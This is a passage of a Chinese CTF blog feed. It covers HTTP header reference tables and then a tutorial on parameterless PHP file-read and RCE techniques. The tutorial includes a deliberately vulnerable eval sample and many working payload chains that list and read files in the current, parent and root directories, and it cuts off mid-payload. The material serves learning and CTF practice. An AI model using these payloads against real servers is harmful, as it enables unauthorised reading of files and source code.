127.0.0.1</td></tr></tbody></table><p>buuctf 那一道题用到的就是更改 Referer、User-Agent、X-Forwarded-For</p><p>X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的 请求端真实的 IP ，只有在通过了 HTTP 代理或者负载均衡服务器时才会添加该项。</p><h2 id="http-响应header大全"><a class="markdownIt-Anchor" href="#http-响应header大全">#</a> http — 响应 header 大全</h2><table><thead><tr><th style="text-align:center">Header</th><th style="text-align:center">解释</th><th style="text-align:center">示例</th></tr></thead><tbody><tr><td style="text-align:center">Accept-Ranges</td><td style="text-align:center">代表服务器是否支持指定范围请求及哪一种类型的分段请求</td><td style="text-align:center">Accept-Ranges: bytes</td></tr><tr><td style="text-align:center">Age</td><td style="text-align:center">从原始服务器到代理缓存造成的估算时间（以秒计，非负）</td><td style="text-align:center">Age: 12</td></tr><tr><td style="text-align:center">Allow</td><td style="text-align:center">对某网络资源的有效的请求行为，不容许则返回 405</td><td style="text-align:center">Allow: GET, HEAD</td></tr><tr><td style="text-align:center">Cache-Control</td><td style="text-align:center">告诉全部的缓存机制是否能够缓存及哪一种类型</td><td style="text-align:center">Cache-Control: no-cache</td></tr><tr><td style="text-align:center">Content-Encoding</td><td style="text-align:center">web 服务器支持的返回内容压缩编码类型。</td><td style="text-align:center">Content-Encoding: gzip</td></tr><tr><td style="text-align:center">Content-Language</td><td style="text-align:center">响应体的语言</td><td style="text-align:center">Content-Language: en,zh</td></tr><tr><td style="text-align:center">Content-Length</td><td style="text-align:center">响应体的长度</td><td style="text-align:center">Content-Length: 348</td></tr><tr><td style="text-align:center">Content-Location</td><td style="text-align:center">请求资源可替代的备用的另外一地址</td><td style="text-align:center">Content-Location: /index.htm</td></tr><tr><td style="text-align:center">Content-MD5</td><td style="text-align:center">返回资源的 MD5 校验值</td><td style="text-align:center">Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</td></tr><tr><td style="text-align:center">Content-Range</td><td style="text-align:center">在整个返回体中本部分的字节位置</td><td style="text-align:center">Content-Range: bytes 21010-47021/47022</td></tr><tr><td style="text-align:center">Content-Type</td><td style="text-align:center">返回内容的 MIME 类型</td><td style="text-align:center">Content-Type: text/html; charset=utf-8</td></tr><tr><td style="text-align:center">Date</td><td style="text-align:center">原始服务器消息发出的时间</td><td style="text-align:center">Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td style="text-align:center">ETag</td><td style="text-align:center">请求变量的实体标签的当前值</td><td style="text-align:center">ETag: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td style="text-align:center">Expires</td><td style="text-align:center">响应过时的日期和时间</td><td style="text-align:center">Expires: Thu, 01 Dec 2010 16:00:00 GMT</td></tr><tr><td style="text-align:center">Last-Modified</td><td style="text-align:center">请求资源的最后修改时间</td><td style="text-align:center">Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</td></tr><tr><td style="text-align:center">Location</td><td style="text-align:center">用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源</td><td style="text-align:center">Location: <a href="http://www.zcmhi.com/archives/94.html">http://www.zcmhi.com/archives/94.html</a></td></tr><tr><td style="text-align:center">Pragma</td><td style="text-align:center">包括实现特定的指令，它可应用到响应链上的任何接收方</td><td style="text-align:center">Pragma: no-cache</td></tr><tr><td style="text-align:center">Proxy-Authenticate</td><td style="text-align:center">它指出认证方案和可应用到代理的该 URL 上的参数</td><td style="text-align:center">Proxy-Authenticate: Basic</td></tr><tr><td style="text-align:center">refresh</td><td style="text-align:center">应用于重定向或一个新的资源被创造，在 5 秒以后重定向（由网景提出，被大部分浏览器支持）</td><td style="text-align:center">Refresh: 5; url=http://www.zcmhi.com/archives/94.html</td></tr><tr><td style="text-align:center">Retry-After</td><td style="text-align:center">若是实体暂时不可取，通知客户端在指定时间以后再次尝试</td><td style="text-align:center">Retry-After: 120</td></tr><tr><td style="text-align:center">Server</td><td style="text-align:center">web 服务器软件名称</td><td style="text-align:center">Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</td></tr><tr><td style="text-align:center">Set-Cookie</td><td style="text-align:center">设置 Http Cookie</td><td style="text-align:center">Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</td></tr><tr><td style="text-align:center">Trailer</td><td style="text-align:center">指出头域在分块传输编码的尾部存在</td><td style="text-align:center">Trailer: Max-Forwards</td></tr><tr><td style="text-align:center">Transfer-Encoding</td><td style="text-align:center">文件传输编码</td><td style="text-align:center">Transfer-Encoding:chunked</td></tr><tr><td style="text-align:center">Vary</td><td style="text-align:center">告诉下游代理是使用缓存响应仍是从原始服务器请求</td><td style="text-align:center">Vary: *</td></tr><tr><td style="text-align:center">Via</td><td style="text-align:center">告知代理客户端响应是经过哪里发送的</td><td style="text-align:center">Via: 1.0 fred, 1.1 <a href="http://nowhere.com">nowhere.com</a> (Apache/1.1)</td></tr><tr><td style="text-align:center">Warning</td><td style="text-align:center">警告实体可能存在的问题</td><td style="text-align:center">Warning: 199 Miscellaneous warning</td></tr><tr><td style="text-align:center">WWW-Authenticate</td><td style="text-align:center">代表客户端请求实体应该使用的受权方案</td><td style="text-align:center">WWW-Authenticate: Basic</td></tr></tbody></table><h2 id="请求方法大全"><a class="markdownIt-Anchor" href="#请求方法大全">#</a> 请求方法大全</h2><table><thead><tr><th style="text-align:center">方法</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">GET</td><td style="text-align:center">发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外 get 支持快取、缓存、可保留书签等。幂等</td></tr><tr><td style="text-align:center">POST</td><td style="text-align:center">和 get 一样很常见，向服务器提交资源让服务器处理，比如提交表单、上传文件等，可能导致建立新的资源或者对原有资源的修改。提交的资源放在请求体中。不支持快取。非幂等</td></tr><tr><td style="text-align:center">HEAD</td><td style="text-align:center">本质和 get 一样，但是响应中没有呈现数据，而是 http 的头信息，主要用来检查资源或超链接的有效性或是否可以可达、检查网页是否被串改或更新，获取头信息等，特别适用在有限的速度和带宽下。</td></tr><tr><td style="text-align:center">PUT</td><td style="text-align:center">和 post 类似，html 表单不支持，发送资源与服务器，并存储在服务器指定位置，要求客户端事先知道该位置；比如 post 是在一个集合上（/province），而 put 是具体某一个资源上（/province/123）。所以 put 是安全的，无论请求多少次，都是在 123 上更改，而 post 可能请求几次创建了几次资源。幂等</td></tr><tr><td style="text-align:center">DELETE</td><td style="text-align:center">请求服务器删除某资源。和 put 都具有破坏性，可能被防火墙拦截。如果是 https 协议，则无需担心。幂等</td></tr><tr><td style="text-align:center">CONNECT</td><td style="text-align:center">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。就是把服务器作为跳板，去访问其他网页然后把数据返回回来，连接成功后，就可以正常的 get、post 了。</td></tr><tr><td style="text-align:center">OPTIONS</td><td style="text-align:center">获取 http 服务器支持的 http 请求方法，允许客户端查看服务器的性能，比如 ajax 跨域时的预检等。</td></tr><tr><td style="text-align:center">TRACE</td><td style="text-align:center">回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击或盗取信息。</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷 buuctf 的时候遇到一道 http 1 的题目目前还没记录在博客里，里面涉及到这个知识所以归纳一下&lt;/p&gt;</summary>
    
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/categories/ctfweb/"/>
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/tags/ctfweb/"/>
    
  </entry>
  
  <entry>
    <title>无参数读取文件和rce总结</title>
    <link href="https://dr4x3zz.github.io/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/"/>
    <id>https://dr4x3zz.github.io/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/</id>
    <published>2023-04-20T16:50:40.000Z</published>
    <updated>2023-04-21T15:12:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>做鲲鹏杯测试平台时遇到了一道无参数读取文件，学习一下相关知识，做个总结</p><span id="more"></span><p>学习链接：<a href="https://zhuanlan.zhihu.com/p/157431794">https://zhuanlan.zhihu.com/p/157431794</a></p><p>感觉全篇都是精华，而且很具体，没办法去缩减基本照搬过来记录一下</p><h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2><p>什么是无参数？</p><p>顾名思义，就是只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数等</p><h2 id="代码解析"><a class="markdownIt-Anchor" href="#代码解析">#</a> 代码解析</h2><p>接下来，从代码开始讲解无参数读文件和 RCE 的具体技巧，帮助读者熟悉 PHP 的各种函数、记住无参数读文件和 RCE 的各类方法：</p><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这里使用 <code>preg_replace()</code>  替换匹配到的字符为空， <code>\w</code>  匹配字母、数字和下划线，等价于  <code>[^A-Za-z0-9_]</code> ，然后 <code>(?R)?</code>  这个意思为递归整个匹配模式</p><p>所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有 <code>;</code></p><p>举个例子：</p><p><code>a(b(c()));</code>  可以使用，但是 <code>a('b')</code>  或者 <code>a('b','c')</code>  这种含有参数的都不能使用（我的理解时’b’和’c’在函数里会被作为参数）</p><p>所以我们要使用无参数的函数进行文件读取或者命令执行</p><h2 id="无参数任意文件读取"><a class="markdownIt-Anchor" href="#无参数任意文件读取">#</a> 无参数任意文件读取</h2><h3 id="查看当前目录文件名"><a class="markdownIt-Anchor" href="#查看当前目录文件名">#</a> 查看当前目录文件名</h3><p>正常的， <code>print_r(scandir('.'));</code>  可以用来查看当前目录所有文件名，而 <code>.</code>  是不包含在 <code>\w</code>  里面导致其它函数都被转为空格，这个点没有办法被替换为空格，使得 <code>;</code>  没法等于 <code>.;</code>  没办法执行下一个 eval 函数，所以要想办法用函数来代替 <code>.</code></p><h4 id="1localeconv"><a class="markdownIt-Anchor" href="#1localeconv">#</a> 1.localeconv()</h4><p><code>localeconv()</code>  返回一包含本地数字及货币格式信息的数组。而数组第一项就是 <code>&quot;.&quot;</code> （后续出现的 <code>.</code>  都用双引号包裹，方便识别）</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/a.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>要怎么取到这个点呢，另一个函数：</p><p><code>current()</code>  返回数组中的单元，默认取第一个值</p><blockquote><p><strong>current (localeconv ())  永远都是个点</strong></p></blockquote><p><code>print_r(scandir(current(localeconv())));</code></p><p>或者使用 <code>print_r(scandir(pos(localeconv())));</code> ， <code>pos</code>  是 <code>current</code>  的别名</p><p>如果都被过滤还可以使用 <code>reset()</code> ，该函数返回数组第一个单元的值，如果数组为空则返回 <code>FALSE</code></p><h4 id="2chr46"><a class="markdownIt-Anchor" href="#2chr46">#</a> 2.chr(46)</h4><p><code>chr(46)</code>  就是字符 <code>&quot;.&quot;</code></p><p>要构造 46，有几个方法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chr(rand()) (不实际，看运气)</span><br><span class="line"></span><br><span class="line">chr(time())</span><br><span class="line"></span><br><span class="line">chr(current(localtime(time())))</span><br></pre></td></tr></table></figure><ul><li><code>chr(time())</code> ：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr()`函数以256为一个周期，所以`chr(46)`,`chr(302)`,`chr(558)`都等于`&quot;.&quot;</span><br></pre></td></tr></table></figure><p>所以使用 <code>chr(time())</code> ，一个周期必定出现一次 <code>&quot;.&quot;</code></p><ul><li><code>chr(current(localtime(time())))</code> ：</li></ul><p>数组第一个值每秒 + 1，所以最多 60 秒就一定能得到 46，用 <code>current(pos)</code>  就能获得 <code>&quot;.&quot;</code></p><h4 id="3phpversion"><a class="markdownIt-Anchor" href="#3phpversion">#</a> 3.phpversion()</h4><p><code>phpversion()</code>  返回 PHP 版本，如 <code>5.5.9</code></p><p><code>floor(phpversion())</code>  返回  <code>5</code></p><p><code>sqrt(floor(phpversion()))</code>  返回 <code>2.2360679774998</code></p><p><code>tan(floor(sqrt(floor(phpversion()))))</code>  返回 <code>-2.1850398632615</code></p><p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>  返回 <code>4.5017381103491</code></p><p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>  返回 <code>45.081318677156</code></p><p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>  返回 <code>46</code></p><p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>  返回 <code>&quot;.&quot;</code></p><h4 id="4crypt"><a class="markdownIt-Anchor" href="#4crypt">#</a> 4.crypt()</h4><p><code>hebrevc(crypt(arg))</code>  可以随机生成一个 hash 值，第一个字符随机是 <code>$</code> (大概率) 或者  <code>&quot;.&quot;</code> (小概率) 然后通过 <code>chr(ord())</code>  只取第一个字符</p><p>ps： <code>ord()</code>  返回字符串中第一个字符的 Ascii 值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))));<span class="comment">//（多刷新几次）</span></span><br></pre></td></tr></table></figure><p>同理： <code>strrev(crypt(serialize(array())))</code>  也可以得到 <code>&quot;.&quot;</code> ，只不过 <code>crypt(serialize(array()))</code>  的点出现在最后一个字符，需要使用 <code>strrev()</code>  逆序，然后使用 <code>chr(ord())</code>  获取第一个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure><p>PHP 的函数如此强大，获取 <code>&quot;.&quot;</code>  的方法肯定还有许多</p><p>正常的，我们还可以用 <code>print_r(scandir('绝对路径'));</code>  来查看当前目录文件名</p><p>获取绝对路径可用的有 <code>getcwd()</code>  和 <code>realpath('.')</code></p><p>所以我们还可以用 <code>print_r(scandir(getcwd()));</code>  输出当前文件夹所有文件名</p><h3 id="读取当前目录文件"><a class="markdownIt-Anchor" href="#读取当前目录文件">#</a> 读取当前目录文件</h3><p>通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如 PHP 源码，我们还需要使用函数读取：</p><p>前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢：</p><p>查询 PHP 手册发现：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/b.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>手册里有这些方法，如果要获取的数组是最后一个我们可以用：</p><p><code>show_source(end(scandir(getcwd())));</code>  或者用 <code>readfile</code> 、 <code>highlight_file</code> 、 <code>file_get_contents</code>  等读文件函数都可以（使用 <code>readfile</code>  和 <code>file_get_contents</code>  读文件，显示在源码处）</p><p>ps： <code>readgzfile()</code>  也可读文件，常用于绕过过滤</p><p>介绍一个函数： <code>array_reverse()</code>  以相反的元素顺序返回数组</p><p>文件本来在最后一位，反过来就成为第一位，可以直接用 <code>current(pos)</code>  读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure><p>如果是倒数第二个我们可以用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure><p>如果不是数组的最后一个或者倒数第二个呢？</p><p>我们可以使用 <code>array_rand(array_flip())</code> ， <code>array_flip()</code>  是交换数组的键和值， <code>array_rand()</code>  是随机返回一个数组</p><p>所以我们可以用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>（可以自己结合前面总结的构造 <code>&quot;.&quot;</code>  的方法切合实际过滤情况读取，后文就只列举简单的语句）</p><p>多刷新几次，就读到了正着数或者倒着数都是第三位的 flag 文件</p><h3 id="查看上一级目录文件名"><a class="markdownIt-Anchor" href="#查看上一级目录文件名">#</a> 查看上一级目录文件名</h3><p>再介绍几个函数：</p><p><code>dirname()</code>  ：返回路径中的目录部分，比如：</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/c.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p><p><code>chdir()</code>  ：改变当前工作目录</p><h4 id="dirname方法"><a class="markdownIt-Anchor" href="#dirname方法">#</a> dirname () 方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure><p>构造 <code>&quot;..&quot;</code></p><p><code>print_r(next(scandir(getcwd())));</code> ：我们 <code>scandir(getcwd())</code>  出现的数组第二个就是 <code>&quot;..&quot;</code> ，所以可以用 <code>next()</code>  获取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));<span class="comment">//也可查看上级目录文件</span></span><br></pre></td></tr></table></figure><p>结合上文的一些构造都是可以获得 <code>&quot;..&quot;</code>  的 ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))))</span><br></pre></td></tr></table></figure><h3 id="读取上级目录文件"><a class="markdownIt-Anchor" href="#读取上级目录文件">#</a> 读取上级目录文件</h3><p>直接 <code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>  是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录</p><p>前面写到了 <code>chdir()</code> ，使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br></pre></td></tr></table></figure><p>即可改变当前目录为上一层目录并读取文件</p><p>如果不能使用 <code>dirname()</code> ，可以使用构造 <code>&quot;..&quot;</code>  的方式切换路径并读取：</p><p>但是这里切换路径后 <code>getcwd()</code>  和 <code>localeconv()</code>  不能接收参数，因为语法不允许，我们可以用之前的 <code>hebrevc(crypt(arg))</code></p><p>这里 <code>crypt()</code>  和 <code>time()</code>  可以接收参数，于是构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));</span><br><span class="line">或更复杂的：</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));</span><br><span class="line">还可以用：</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localtime</span>(<span class="title function_ invoke__">time</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))))))))))));<span class="comment">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span></span><br></pre></td></tr></table></figure><p>多刷新几次</p><p>还有一种构造方法 <code>if()</code> ：（这种更直观些，并且不需要找可接收参数的函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))))<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure><h3 id="查看和读取根目录文件"><a class="markdownIt-Anchor" href="#查看和读取根目录文件">#</a> 查看和读取根目录文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure><p><code>strrev(crypt(serialize(array())))</code>  所获得的字符串第一位有几率是 <code>/</code> ，所以使用以上 payload 可以查看根目录文件</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/d.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>但是有权限限制，linux 系统下需要一定的权限才能读到，所以不一定成功</p><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/e.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>同样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br></pre></td></tr></table></figure><p>也可以查看根目录文件，但是也会受到权限限制，不一定成功</p><p>读根目录文件：(也是需要权限)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ 